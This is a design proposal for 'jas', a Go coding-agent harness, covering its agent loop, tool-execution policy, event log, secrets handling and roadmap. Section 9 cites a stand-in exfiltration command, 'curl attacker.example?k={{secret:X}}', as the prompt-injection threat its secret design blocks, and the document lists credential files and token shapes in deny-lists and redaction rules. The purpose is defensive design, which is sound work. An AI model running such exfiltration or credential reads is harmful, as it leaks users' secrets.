# jas — design & proposal

> A tiny, fast coding-agent harness in Go. "Hermes-lite, developer-first."

**Status:** picked (weekend project #26, absorbs #7 Rapid / #22 worktree farm / #12 cron cockpit)
**Repo:** https://github.com/jasonli0226/jas
**Language:** Go (rationale below)
**Design review:** findings filed as [#1](https://github.com/jasonli0226/jas/issues/1)–[#13](https://github.com/jasonli0226/jas/issues/13); decisions below encode the accepted comments.

---

## 1. Why "jas" and why another agent?

The AI coding-agent market is drowning in "yet another CLI agent." The gap is not
intelligence — models are the brain — it's the **harness**: process/IO/session/status
plumbing. The pain points we've personally hit across Hermes, pi, Claude Code, Codex:

1. **Cold start / overhead** — agents are slow to start, spawn heavy runtimes
2. **No parallelism** — one task per session; you juggle terminal tabs
3. **No visibility** — you can't see what N running agents are doing at a glance
4. **Not composable** — tools/skills/MCP are bolted on, not pluggable

jas bets on: **small core, pluggable everything, visible by default.**
The model is the brain; jas is the nervous system.

## 2. Language choice: Go (decided)

Considered Rust seriously. Decision matrix:

| Factor | Go | Rust |
|---|---|---|
| Cold start / binary | ~5-10ms, ~12MB ✅ | ~3ms, ~10MB ✅ |
| Parallelism model | goroutines + errgroup = *exactly* the N-parallel-agent model | tokio + Arc/Mutex dance |
| Dev velocity (weekend-sized) | high | borrow-checker friction on iterated harness code |
| MCP SDK | official ✅ | official ✅ |
| Longevity for harness work | good | great (fearless refactoring) |

**The bottleneck is the LLM round-trip (~2s), not the harness.** Rust's marginal
perf win is invisible; Go's velocity win is real. If Rust ever becomes the goal,
the agent-loop design here ports cleanly — the core is 6 interfaces (§3).

Prompt assembly is **cache-friendly** (see #5): stable prefix order is
`system → tools → early messages` so providers with prompt caching keep hitting
the same prefix. Cold start stays a hygiene metric (§7); the metrics that
actually measure the harness are cache-hit rate, turns/task, and tokens/task.

## 3. Architecture

```
jas (single Go binary)
│
├── core/                    the harness
│   ├── session.go           one session = prompt + model + toolset + event log
│   ├── loop.go              the agent loop: build prompt → stream → parse tool calls → execute
│   ├── tools.go             Tool interface + registry (read-only vs mutating)
│   ├── sandbox.go           exec policy (cwd, timeout, deny patterns, env allowlist,
│   │                        path confinement). Shell is YOLO in v1 — see §3.1 / #1
│   ├── approve.go           --approve=never|mutating|shell gate (v1; default never)
│   ├── redact.go            output redaction middleware (§9 layer 2)
│   ├── budget.go            prompt-token tracking + tool-result elision (v1); compaction (v2)
│   └── events.go            versioned JSONL events (single writer; §3.2)
│
├── providers/               provider-neutral stream; OpenAI chat-completions adapter (v1)
│   ├── types.go             Message / ContentBlock / StreamEvent (provider-neutral)
│   └── openai.go            OpenRouter/vLLM/ollama. Retry/backoff, SSE idle timeout.
│
├── tools/                   built-in toolset (v1; mcp/web/git_clone = v2)
│   ├── shell.go             run commands (YOLO + --approve gate; §3.1)
│   ├── files.go             read/write/edit/ls (edit = exact-match replace, see below)
│   ├── grep.go              regex search (ripgrep-style, no ripgrep dep)
│   ├── git_clone.go         shallow clone, path-confined to session dir (v2; §12.1)
│   └── mcp.go               MCP client (stdio + HTTP) — external tools become tools (v2)
│
├── settings/                ~/.jas/ agent dir (§10, v2 — v1 uses env vars + AGENTS.md)
│   ├── config.go            scoped resolution: CLI > project > global > defaults
│   └── auth.go              auth.json / models.json, key resolution
├── scenario/                loader + merger + bootstrap (§8, v2)
│   ├── loader.go            .jas/scenario.yaml discovery, layer-merge
│   └── bootstrap.go         deterministic project scan → draft scenario.yaml
│
├── farm/                    parallel tasks (v2)
│   ├── worktree.go          one git worktree + branch per task
│   ├── runner.go            goroutine per task, errgroup supervision
│   └── queue.go             task queue + review queue (diff/merge/discard)
│
├── ui/                      visibility (v2, minimal stdout in v1)
│   ├── tui.go               Bubble Tea dashboard: N live sessions, status, last event
│   └── attach.go            `jas attach <task>` to take over a session interactively
│
└── cmd/jas/
    ├── main.go              single binary entry
    └── commands.go          jas run [--approve=…] | jas farm | jas attach | jas tasks
```

### The six interfaces

README's "6 interfaces total" are these (everything else is data or a thin
adapter). See also #5.

| # | Interface | Role |
|---|---|---|
| 1 | `Provider` | `Stream(ctx, req) ←chan StreamEvent` — LLM round-trips |
| 2 | `Tool` | `Name / Schema / Call` — built-ins + MCP wrappers |
| 3 | `EventLog` | append-only versioned JSONL writer (audit + resume + future RPC) |
| 4 | `ExecPolicy` | cwd, timeout, env allowlist, path confinement, deny patterns |
| 5 | `Approver` | `--approve=never\|mutating\|shell` gate before tool exec |
| 6 | `UI` | print / JSONL-stdout / (v2) TUI+attach |

Provider-neutral types live in `providers/types.go`: `Message`, `ContentBlock`
(text / tool_use / tool_result), `StreamEvent`, `Usage`. The OpenAI
chat-completions + SSE adapter is the only v1 backend; Anthropic-style deltas
are handled inside that adapter (or a later one), never leaked into the loop.
The provider layer retries 429/5xx with exponential backoff and enforces an
SSE idle timeout (no bytes for N seconds → cancel the stream).

### The agent loop (core, ~200 lines)

```go
for turn := 0; turn < maxTurns; turn++ {      // JAS_MAX_TURNS, default 50
    if budget.WouldExceed(messages) {         // v1: prompt_tokens vs model window
        return errContextFull                 // clean stop; summarization = v2
    }
    stream := provider.Stream(ctx, messages)  // SSE; retry/backoff inside provider
    acc := newAccumulator()                   // tool calls arrive as *deltas*
    for ev := range stream {                  // single pass: print text AND reassemble
        if ev.Text != "" { ui.Print(ev) }
        acc.Add(ev)
    }
    msg, tc := acc.Done()
    messages.Append(msg)
    if len(tc) == 0 { break }                 // no tool calls → final answer
    results := exec.Run(ctx, tc)              // see Tool execution policy below
    // errors are RESULTS, not failures — the model sees the error and retries
    messages.Append(results...)
    budget.ElideOldToolResults(messages, K)   // keep last K verbatim; stub the rest
    // ctx cancel (Ctrl-C): abort stream, synthesize cancelled tool results, flush log
}
```

### Tool execution policy

Each tool declares whether it is read-only (`read`, `ls`, `grep`) or mutating
(`write`, `edit`, `shell`). MCP tools default to **mutating** unless the MCP
descriptor sets `readOnlyHint` (safe default: external tools are untrusted).
See #3.

Execution batches by consecutive kind:

1. Walk the model's `tool_calls` in order.
2. A run of consecutive read-only calls executes **in parallel** (errgroup).
3. Each mutating call is a **barrier**: wait for the prior batch, run the
   mutator alone, then continue. `[read A, edit A, read A]` therefore observes
   A before and after the edit — never both reads racing the edit.
4. Results are always returned in `tool_call` order, regardless of completion
   order.

Every tool result is capped (`JAS_MAX_TOOL_OUTPUT`, default 32KB): longer
output is truncated with a `[truncated: N more lines]` marker. On top of that,
v1 tracks `usage.prompt_tokens` against the per-model window and **elides**
old tool results (keep the last K verbatim; earlier ones become
`[elided: read foo.go 412 lines]`). A provider `context_length_exceeded`
becomes a clean stop with a clear message. Full summarization compaction
(pi's `window − reserve` threshold) stays v2. See #2.

### Event log & resume

Every step appends a versioned JSONL event to `<session>/events.jsonl` — the
audit log and, from v2, the checkpoint/resume + RPC wire format. Record shape
from day one (see #6):

```json
{"v":1,"id":"…","parent_id":"…","seq":42,"ts":"…","type":"tool_started", …}
```

`parent_id` is null for the trunk in v1; v2 session-tree/fork fills it in for
free. **Single writer:** all appends go through one `EventLog` goroutine;
concurrent callers send events. The writer fsyncs after each turn's tool
results — and, for mutating calls, fsyncs `tool_started` **before** the call
executes (write-ahead; see #4).

**Side effects and resume (v1 design, resume shipped in v2):**

1. Mutating call → fsync `tool_started` → execute → `tool_result`.
2. On resume, a `tool_started` with no matching `tool_result` is **never**
   re-executed: it is recorded as an `interrupted`/`cancelled` result and the
   model decides next.
3. Ctrl-C mid-turn synthesizes `cancelled` tool results for any dangling
   `tool_calls` so the next chat-completions request is well-formed (no 400).
4. Shell children run with `Setpgid: true`; cancel kills the process group and
   uses `WaitDelay` so grandchildren cannot outlive the tool call.

### 3.1 Shell security stance (v1)

**pi-style YOLO, documented loudly** (see #1). Path confinement and the deny
floor apply to the *file* tools. The `shell` tool inherits an allowlisted env
(`PATH`, `HOME`, `USER`, `LANG`, `TERM`, `TMPDIR`, plus scenario additions)
and can still reach anything `HOME` can — `cat ~/.aws/credentials`,
`python -c`, `curl`. In-process string guards on the command line are theater
and are **not** claimed as a security boundary.

- v1 CLI: `--approve=never|mutating|shell` (default `never` = permissive).
  The tool-exec path always consults the Approver so the gate is real even
  when it defaults open.
- If you care about isolation: run jas (or each farm task) inside
  **bubblewrap/Docker**. That is the documented answer in v1 and the planned
  per-task option in v3 — not a pretend in-process sandbox.

### The Tool interface (the whole extensibility story)

```go
type Tool interface {
    Name() string
    Schema() json.RawMessage   // JSON-schema for the model
    Call(ctx, args json.RawMessage) (Result, error)   // ctx carries timeout + sandbox
}
```

- Built-ins implement it directly.
- MCP servers (v2) are loaded at startup and wrapped into the same interface;
  default to mutating unless `readOnlyHint` is set (Tool execution policy above).
- **Edit format:** the `edit` tool takes `{path, old_string, new_string}`.
  `old_string` must match exactly once in the file (otherwise the call returns an
  error asking for more context). This is the same exact-match format pi and
  Claude Code use; it is more reliable with current models than unified diffs.
  `write`/`edit` refuse content containing a `[REDACTED:` marker (§9) with an
  explicit **"region contains redacted content"** error (not a silent no-match
  loop — see #7). Per-path opt-out covers fixture/docs paths that legitimately
  hold example keys.
- **Path confinement:** file tools resolve paths with `filepath.EvalSymlinks`
  and refuse anything outside the project root before the deny-list check runs.
  (Does not confine `shell` — see §3.1 / #1.)
- **Shell environment:** `shell` runs children with an allowlisted environment
  (`PATH`, `HOME`, `USER`, `LANG`, `TERM`, `TMPDIR`, plus names the scenario
  adds), never jas's own environment. `JAS_API_KEY` and other provider keys
  are never visible to tools.
- **Project instructions (v1):** load `AGENTS.md` (and `CLAUDE.md` as a
  fallback) from cwd into the system prompt — ~20 lines, large lift (#8).
  Complements, does not replace, `scenario.yaml` runtime policy (#9).
- **Skills (v3):** a skill = `SKILL.md` + optional tool manifests per the
  agentskills.io spec; loaded into system prompt or a toolset. Interop with
  Claude Code/Hermes. Not in v1.

## 4. v1 scope (weekend one)

**Goal:** a single Go binary that beats `pi --print` on cold start and runs a real
coding task end-to-end.

- [ ] `jas run "task string"` — streaming chat loop, OpenAI-compatible endpoint
- [ ] `jas run --json` — emit events to stdout as JSONL (cheap; the future RPC wire format)
- [ ] `jas run --approve=never|mutating|shell` — approval gate on the tool-exec path
      (default `never`; see §3.1 / #1)
- [ ] built-in tools: shell, read/write/edit file, ls, grep
- [ ] tool execution policy: consecutive read-only batches in parallel; each
      mutating call is a barrier; MCP defaults mutating unless `readOnlyHint` (§3 / #3)
- [ ] context budget (#2): track `usage.prompt_tokens` vs per-model window;
      elide old tool results (keep last K); `context_length_exceeded` → clean stop
- [ ] `JAS_MAX_TURNS` cap (default 50) — cost caps are v2, so v1 needs a runaway stop
- [ ] SSE tool-call delta reassembly (fuzz-tested against recorded streams);
      provider retry/backoff on 429/5xx; SSE idle timeout (#5)
- [ ] versioned JSONL event log at `~/.jas/sessions/<id>/events.jsonl`
      (`v`, `id`, `parent_id`, `seq`, `ts`, `type` — #6); single writer;
      fsync `tool_started` before mutating exec; synthesize `cancelled` results
      on Ctrl-C; process-group kill (#4). Token usage logged per request.
      v1 creates `~/.jas/sessions/` only; the rest of the settings dir is v2
- [ ] load `AGENTS.md` / `CLAUDE.md` from cwd into the system prompt (#8)
- [ ] secrets layers 1, 2 and 4 (§9): compiled-in deny floor, output redaction
      (with explicit redacted-region edit error + per-path opt-out — #7),
      redacted event log; shell env allowlist; path confinement (file tools)
- [ ] `JAS_MODEL`, `JAS_BASE_URL`, `JAS_API_KEY` env config (settings dir = v2)
- [ ] benchmarks: hygiene cold start; primary = cache-hit / turns / tokens (§7 / #13)
- [ ] README + demo GIF

**Explicitly out of v1:** MCP, TUI, farm, skills, scenarios (and therefore
project trust), full summarization compaction. Resist scope creep.
Shell isolation for people who care = run under bubblewrap/Docker (documented;
per-task containers ship in v3).

## 5. v2 scope (weekend two+)

- [ ] `jas farm --n 3` — git worktree per task, parallel run, review queue
- [ ] `jas attach` — interactive takeover of a running task
- [ ] MCP client support (stdio first, then HTTP)
- [ ] Bubble Tea TUI: live status board of running/queued tasks
- [ ] **Auto-compaction** (pi parity): trigger at `window − reserve`
      (16k default); summarize older history with a cheap model into a summary
      entry; originals kept in the session file (v1 already elides tool results)
- [ ] **Session tree**: `parent_id` already on events from v1 → branches, fork,
      clone (branch summaries reuse compaction)
- [ ] **RPC mode**: long-lived `jas serve` speaking JSONL on stdio — the farm
      runner, TUI, and future Telegram bot all talk to it
- [ ] **Scenarios** (§8) and **project trust** (§11), shipped together: trust
      only matters once project scenarios can declare hooks/MCP
- [ ] **Checkpoint/resume** from `events.jsonl` replay (§3 side-effect rules)
- [ ] **Blind secret access** (§9 layer 3)
- [ ] **Web access**: `web_fetch` + `web_search` + `git_clone` scenario tools (§12.1)
- [ ] **Steering & follow-up queues**: user messages enter after the current
      turn or after the run ends; one-at-a-time/all
- [ ] **Evals**: fixed-task eval harness with fixtures — with/without scenario
      lift reports (pi's vitest-evals idea, simplified)

## 6. v3 ideas

- skills (instruction+tool manifests) — Hermes-style, aligned with the
  agentskills.io `SKILL.md` spec (pi follows it; interop with Claude Code/Hermes)
- optional `.mcp.json` interop alongside `scenario.yaml`'s `mcp:` block
  (scenario.yaml remains the single runtime-policy format — #9)
- **`jas learn <topic>`**: research → draft → save a skill (see §12.2)
- codemode: model-written JS in a **goja** (pure-Go JS) sandbox, tools as the
  only capability (absorbs backlog #14 mini-codemode)
- virtual models: routing model that dispatches each request to a physical
  model (`jas/auto:low → cheap-model`) (absorbs backlog #3)
- git-installable scenario/skill packages (`jas scenario install git:…`)
- containerized farm tasks (bubblewrap/Docker) — same isolation answer
  documented for v1 (#1), now a first-class per-task option
- tool-trace replay & cost simulator (absorbs backlog #11)
- Jev-classifier tool-risk gate (absorbs #5)
- OTel export of sessions (telemetry)

## 7. Benchmarks (v1 acceptance)

Cold start stays a **hygiene** metric (guards accidental dependency bloat —
essentially free via `go build`). Primary metrics measure whether the harness
(prompt construction, tool policy, output caps, elision) is efficient — which
is jas's thesis. See #13.

| kind | metric | target |
|---|---|---|
| hygiene | cold start | < 50ms (`jas --version`; `jas run` up to the first HTTP request sent) |
| hygiene | binary size | < 15MB static |
| primary | cache-hit rate | report vs pi on the same model/provider (stable prompt prefix §2) |
| primary | turns / task | 3 fixed tasks: fewer is better; "add a header comment to main.go" ≤ 3 turns |
| primary | tokens / task | same 3 fixed tasks: total prompt+completion tokens reported vs pi |
| secondary | wall-clock / TTFT | reported alongside, not optimized for |

## 8. Scenarios: declarative runtime policy (v2)

A scenario = a preset bundle of (system prompt + toolset + sandbox policy + hooks).
**Scenarios are data, never hard-coded.** `.jas/scenario.yaml` in a repo governs
how jas operates there — the **single runtime-policy format** (deny patterns,
sandbox, toolsets, hooks, mcp). See #9.

- **AGENTS.md** (adopted in v1, #8) complements scenario.yaml: project
  instructions for the model. It cannot express runtime policy.
- **SKILL.md / `.mcp.json`** stay on the v3 roadmap for interop; they do **not**
  replace `scenario.yaml`.
- **Blueprints** (scaffold-from-preset / `jas new` / `jas scenario save`) are
  **dropped** — they don't advance the agent loop. `jas bootstrap` (below)
  still drafts a scenario from an existing project.

### 8.1 Discovery & precedence (most specific wins, layer-merge)

Scenario discovery follows the single resolution order defined in §10:

```
CLI flag            jas run --scenario <path>       explicit, wins
└── env vars        JAS_MODEL / JAS_BASE_URL / ...  transient overrides
    └── project     .jas/scenario.yaml              per-project, versioned with repo
        └── global  ~/.jas/config.json +            personal defaults
                    ~/.jas/scenarios/<name>/
            └── built-in scenarios/ (Go-compiled)   2-3 starter presets
```

### 8.2 Scenario file (declarative YAML, checked into the repo)

```yaml
# .jas/scenario.yaml
name: my-ml-project
system: |
  You work on an ML research repo. Experiments live in experiments/;
  never touch data/ directly; log every run to results.jsonl.
tools:
  core: [shell, files, grep]
  python: {exec: uv, venv: .venv}
sandbox:
  deny: ["data/**:write", ".git/**:write", ".env*", "secrets/**", "**/.env"]
hooks:
  post_run:    [{script: .jas/hooks/summarize-metrics.sh}]
  pre_apply:   [{script: .jas/hooks/lint.sh}]   # before file-mutation applied (#10)
mcp:
  - {command: uvx, args: [mcp-server-git]}
```

`pre_apply` runs before any file-mutation tool result is applied to disk
(renamed from the earlier `pre_commit` — jas never commits; commits stay with
the human / farm review queue). See #10.

### 8.3 `jas bootstrap` — scenario from an existing project (no LLM)

Deterministic heuristics, instant and repeatable. Writes a draft
`.jas/scenario.yaml` the user hand-edits:

| Signal | Generated |
|---|---|
| `pyproject.toml`/`requirements.txt` | python toolset (uv), venv path, pytest hook |
| `package.json` | node toolset, npm script shortcuts, jest/vitest hook |
| `go.mod` | go toolset, `go test ./...` pre_apply hook |
| `Makefile` targets | named tool shortcuts (`make train` → tool `train`) |
| `experiments/` + `results.jsonl` / MLflow/W&B config | ML guardrails (data/ deny, run logging) |
| `next.config.*`/`vite.config.*` | web-app preset: dev-server + screenshot tools |
| `AGENTS.md`/`CLAUDE.md` | noted; already loaded in v1 — bootstrap may mirror into `system` |
| `.env` present | listed as required env + added to sandbox deny (never read) |
| `.mcp.json`/Hermes config | converted into the `mcp:` block |

What stays compiled-in: only tool *implementations* and the loader/merger.
Scenarios are 100% data.

## 9. Secrets & sensitive data (layers 1, 2, 4 = v1; layer 3 blind secret access = v2)

**Principle: the agent never sees secret *values* — not in tool output, not in
the transcript, not in the event log.** How peers do it, and what jas adopts:

| Approach | Who uses it | jas |
|---|---|---|
| Env passthrough (agent process gets keys) | many naive agents | ❌ root of all leaks |
| Deny-list file reads | Claude Code (`.env` in default ignores) | ✅ baseline |
| Redaction middleware on tool output | pi, modern harnesses | ✅ output scrubber |
| Secret proxy (harness holds keys, agent requests "use key X" blind) | OpenAI Codex cloud, pi | ✅ v2 |
| Env scrubbing for tool subprocesses | Codex, pi | ✅ v1 — shell gets an allowlisted env (§3) |
| Isolated sandbox FS (no dotfiles mounted) | cloud agents | 🔜 documented v1 answer = bubblewrap/Docker (#1); first-class per-task containers in v3. Git worktrees are *not* isolation — they share the user's FS and home dir |

Concretely, four layers (defense in depth — any one failing must not leak):

1. **File deny-list.** v1 ships a **hard floor** compiled into the binary:
   `.env*`, `**/.env`, `secrets/**`, `*.pem`, `id_rsa*`, `*.p12`,
   `.git-credentials`, `~/.aws/**`, `~/.ssh/**`. From v2, scenarios can add
   patterns via `sandbox.deny`; `deny` is additive and the floor cannot be
   lifted. Patterns are matched against the symlink-resolved path (§3).
2. **Output redaction** (core middleware, runs on every tool result before it
   enters the model transcript or event log). Three rules, in order of
   confidence:
   - **Exact values** jas knows are secret: `JAS_API_KEY`, every key in
     `auth.json` (v2), every declared scenario secret (v2). Cheapest and strongest.
   - **Known token shapes:** `sk-…`, `ghp_…`, `AKIA…`, `Bearer …`, JWTs,
     `-----BEGIN … PRIVATE KEY-----`.
   - **High-entropy values only in an assignment context** (`KEY=value`,
     `"key": "value"`, `key: value` where the key name looks secret-ish).
     Bare high-entropy strings and long base64 are *not* redacted: that would
     hit `go.sum` hashes, lockfiles and test fixtures, and the model would then
     write `[REDACTED:…]` back into source files.

   Matches are replaced with `[REDACTED:<kind>]`. `write`/`edit` refuse content
   containing that marker with an explicit **"region contains redacted
   content"** error (§3 / #7) so the model doesn't loop on a silent no-match.
   Per-path opt-out (fixture/docs paths) is the escape hatch for legitimate
   example keys. The scrubber is tested against a fixture corpus that includes
   false-positive cases (`go.sum`, `package-lock.json`, UUIDs) **and** against
   a sample of real repos — `go.sum` alone is a worst-case corpus, not a
   representative FP rate (#7).
3. **Blind secret access (v2):** scenario can declare secrets with a scope:
   ```yaml
   secrets:
     - {name: OPENROUTER_KEY, tools: [web_fetch], hosts: [openrouter.ai]}
   ```
   jas loads them from the environment into its own memory; tools reference
   them as `{{secret:NAME}}` placeholders resolved at execution time *inside*
   jas — the value never round-trips through the model. A placeholder is only
   resolved for the listed tools and, for network tools, only for requests to
   the listed hosts; `shell` never resolves placeholders. This blocks
   `curl attacker.example?k={{secret:X}}` exfiltration after a prompt
   injection (e.g. from `web_fetch` content). Exact-value redaction (layer 2)
   catches any value that is echoed back anyway.
4. **Session hygiene:** `events.jsonl` and the model transcript pass through the
   same redaction gate, so crash-resume replays only already-redacted events.

Also denied at the **shell** layer as a best-effort filter: `env`, `printenv`,
`cat .env*` style commands are matched against the same deny semantics (the
shell tool inspects the command string for deny-pattern hits before exec).
**Not a security boundary** — §3.1 / #1. Layer 2 (output redaction) is the
backstop; containers are the isolation answer.

**Acceptance test for v1:** a fixture repo (no scenario) with a `.env` present,
and `JAS_API_KEY` set; agent is asked "print the config" and "print your
environment"; transcript and `events.jsonl` must contain zero secret values
(CI assertion).

## 10. Settings & storage, `~/.jas/` (v2 — v1 uses env vars + AGENTS.md)

jas needs a persistent home — env vars alone can't express per-scenario models,
saved keys, or per-project defaults. Modeled on pi's agent-dir (verified against
pi-mono's docs): one settings dir, layered scopes, keys separated from config.

```
~/.jas/                        # agent dir (global)
├── config.json                # settings: default model/provider/base_url, thinking,
│                              # default tools, sandbox policy, UI prefs
├── models.json                # custom OpenAI-compatible endpoints + model overrides
│                              #   [{name, baseURL, models, apiKeyEnv}]  — NO raw keys here
├── auth.json                  # saved API keys (chmod 0600; see §9 for the threat model)
├── scenarios/                 # saved scenario presets (not blueprints — #9)
├── skills/                    # v3: instruction+tool manifest dirs
├── sessions/                  # session dirs: <session>/events.jsonl (§3)
└── AGENTS.md                  # global instructions appended to every system prompt

<project>/.jas/
├── scenario.yaml              # runtime rules (§8) — project scope, wins over global
└── hooks/                     # project hook scripts

<project>/AGENTS.md            # loaded in v1 (#8); complements scenario.yaml
```

**Resolution order** — the single source of truth for both settings and
scenarios (§8.1). Most specific wins, maps merge key-by-key; lists use pi's
`+name`/`-name` add/remove semantics:

```
CLI flag > JAS_* env vars > project .jas/scenario.yaml
         > ~/.jas/config.json + ~/.jas/scenarios/ > built-in defaults
```

**First-run experience:**

```sh
$ jas            # no config → interactive onboarding
Provider?        # openrouter | ollama | custom endpoint (→ models.json entry)
API key:         # sk-... → stored in auth.json (0600), or $ENV ref
Default model:   # anthropic/claude-sonnet-4.6
```

**Key management rules:**

- `auth.json` stores either a literal key (chmod 0600, `JAS_NO_PLAINTEXT_KEYS=1`
  refuses to write it) or a `$ENV_NAME` reference resolved at launch — so the
  key can live in a password manager/env instead of on disk.
- Keys NEVER appear in config.json, models.json, or scenario files (§9's blind
  secret access consumes them by name only).
- `jas auth` subcommand: list/add/remove/rotate keys; never echoes values.
- Per-endpoint key resolution: `models.json` entry → `auth.json` name → env var.

**What env vars still do:** transient overrides just below CLI flags
(`JAS_MODEL`, `JAS_BASE_URL`, `JAS_API_KEY` beat project and global config) —
useful for one-off runs and CI; persistent config lives in `~/.jas/`.

**Session storage** stays simple: `~/.jas/sessions/<id>/events.jsonl` (§3) is
the whole story — no DB, replay = tail the file. This path is used from v1
(the only part of `~/.jas/` that v1 creates). Farm task state (v2) lives in
`~/.jas/farm.json`.

## 11. Security acceptance: v1, and project trust in v2

**v1:**

- **Secrets fixture test (from §9):** CI assertion, zero secret values in the
  transcript and event log when a `.env` is present and `JAS_API_KEY` is set.
- **Redaction middleware active in v1** — it's ~60 lines of regex and it is the
  backstop for every later tool that produces output. Its fixture corpus
  includes false-positive cases (`go.sum`, lockfiles) that must pass
  unredacted, plus a real-repo FP sample (#7). Edit of a redacted region
  returns the explicit error; per-path opt-out is tested.
- **Shell env allowlist and path confinement** (§3) covered by tests:
  `printenv` from the shell tool shows no `JAS_*` keys; `read ../outside` and a
  symlink pointing outside the project root are both refused.
- **Shell stance documented** (§3.1): YOLO + `--approve`; containers are the
  isolation answer. No claim that command-string deny is a boundary (#1).
- **Resume contract tests:** crash between `tool_started` fsync and
  `tool_result` does not re-exec; Ctrl-C yields cancelled tool results;
  process-group kill reaps grandchildren (#4).

**v2 — project trust (one-day feature, ships with scenarios):** the first time
jas sees a project `.jas/scenario.yaml` that declares hooks or MCP servers, it
asks `trust this project? [ask/always/never]`. The answer is cached in
`~/.jas/trust.json`, keyed by project path **and a hash of the scenario file
plus its hook scripts** — a `git pull` that changes the hooks asks again. This
is a startup gate only, not a security boundary (pi's model). It exists because
scenarios carry executable hooks.

## 12. Web access & learning (v2/v3)

### 12.1 Web access (pi's answer: core stays thin, an extension package adds it)

Verified from pi-mono source: pi's built-in tools are only
`read, bash, powershell, edit, write, grep, find, ls` — **no web search tool**.
pi's web access happens two ways: the model just runs `curl` via `bash`
(their CHANGELOG fixes "crash when bash outputs binary data (e.g. `curl`
downloading a video file)"), or an extension package —
**pi-web-access** (`pi install npm:pi-web-access`, v0.45.0) provides
search/fetch as a first-class extension.

**What pi-web-access teaches us** (verified from its npm README):

- 4 capabilities: web_search, web_fetch (extract), GitHub cloning, and
  PDF/video understanding (YouTube transcripts + frame extraction)
- ~25 search providers behind one config; keys live in `~/.pi/agent/`
  web-search settings, never in the agent dir
- **Fallback chains** — SearXNG (private) first → subscription-backed OpenAI
  search → Exa (zero-config) → Brave → Tavily → … the keyless providers sit
  in the middle so it works with no keys at all
- GitHub cloning is a **separate capability**, not hidden inside fetch
- The tools also run as a **standalone MCP server** for other agents
- Fetching remote-hosted providers requires explicit opt-in
  (`fetchRouting.allowRemoteHostedProviders`) — privacy posture by default

jas adopts the same philosophy, formalized (see #11):

- **v1:** nothing. The shell tool gives curl for free.
- **v2:** optional scenario tools (pluggable, like pi's MCP approach but native):
  - `web_fetch <url>` — **pure** HTTP GET → HTML stripped to markdown/text
    (pure Go, `x/net/html`). No cloning, no side effects beyond the GET.
  - `web_search <query>` — behind a pluggable provider configured in
    `models.json`-style settings (`search: {provider: tavily|brave|duckduckgo|http}`,
    apiKeyEnv for paid ones; DuckDuckGo HTML scraping needs no key)
  - `git_clone <url> [dest]` — **explicit** shallow clone, path-confined to
    the session dir. The model chooses it when it needs repo context; the
    caller sees the side effects (disk + network). Not a special case of
    `web_fetch`.
- Provider chain: `search.providers` list in settings, tried in order;
  default `[duckduckgo]` (keyless), opt-in extras like `[tavily, brave]`
- Search providers are a tiny interface, not a dependency: `Search(q) []Result`.
- Redaction middleware (§9) applies to tool output → web content is scrubbed
  like any other tool result before it enters the transcript.
- PDF/video understanding is **v3+** (remote servers need API keys); v2 keeps
  to fetch + search + clone.

### 12.2 `jas learn <topic>` — research → skill

The user story: "jas, learn X and remember it for next time." Runs as a normal
agent session with a scenario that gives it: web_search + web_fetch + skill_write.

```
jas learn "how to write a uv venv workflow"      # interactive
jas learn --auto "topic" --out ~/.jas/skills/    # non-interactive
```

Flow: agent researches (§12.1 tools) → drafts `SKILL.md` + `references/` per the
agentskills.io spec (same as pi, so skills interop across Claude Code/Hermes)
→ shows the draft for approval → saves to `~/.jas/skills/<name>/` or project
`.jas/skills/<name>/`. The skill is then advertised to future sessions
(name + description only; full instructions load on demand — pi's model).

Guardrails: `learn` never overwrites an existing skill without `--force`;
`jas skills list` shows what's installed; `jas skills rm <name>`.

## 13. Risks

- **API compat drift** — pin to chat-completions + SSE via a provider-neutral
  message/event layer (#5); Anthropic-style deltas stay inside the adapter.
  Test against OpenRouter AND ollama. Retry/backoff on 429/5xx; SSE idle timeout.
- **SSE delta reassembly** — tool-call chunks split across SSE events differ per
  provider (OpenAI vs Anthropic-style vs vLLM quirks); budget a full day for the
  accumulation logic and fuzz it against recorded streams.
- **Sandbox safety** — v1 shell is YOLO (§3.1 / #1); `--approve` is the gate;
  containers are the isolation answer. Document loudly; do not claim
  command-string deny is a boundary.
- **Scope creep** — farm/TUI/blueprints are out (blueprints dropped entirely,
  #9). If v1 takes 3 weekends, it's a bad project, kill features not quality.
- **Context / cost runaway** — v1 tracks prompt tokens, elides old tool
  results, and clean-stops on `context_length_exceeded` (#2). Cost caps
  (max tokens per session / farm task) and full summarization compaction
  are v2. Usage is logged per request into events.jsonl from day one.
- **Deny-list gaps** — deny semantics are regex/path-glob based and will have
  blind spots (novel secret formats; shell commands that read files indirectly,
  e.g. `python -c`). Symlinks are handled by resolving paths before matching
  (§3). Mitigation: the redaction middleware is the backstop, containers are
  the isolation answer, and the fixture-corpus + real-repo FP tests run on
  every release (#7).
